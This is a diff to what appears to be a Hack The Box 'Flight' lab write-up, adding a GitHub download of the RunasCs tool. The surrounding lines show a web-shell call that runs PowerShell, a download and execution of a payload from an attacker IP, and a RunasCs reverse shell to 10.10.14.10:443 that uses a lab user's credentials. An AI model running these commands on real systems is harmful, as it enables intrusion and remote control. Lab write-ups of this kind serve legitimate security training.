@@ -46,6 +46,7 @@ curl 'http://flight.htb/shell.php?c=powershell%20-c%20%22wget%2010.10.14.10%2Fht
 powershell -c "wget 10.10.14.67/htb.exe -usebasiparsing -outfile C:\users\public\music\htb.exe; C:\users\public\music\htb.exe
 sessions -i ce7
 whoami
+wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
 upload RunasCs.exe
 shell
 .\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.10:443 cmd
@@ -255,6 +256,7 @@ whoami
 ![image](https://github.com/user-attachments/assets/160a9bd1-dd78-4613-ab90-c23219853b1e)
 
 ```
+wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
 upload RunasCs.exe
 shell
 .\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.10:443 cmd
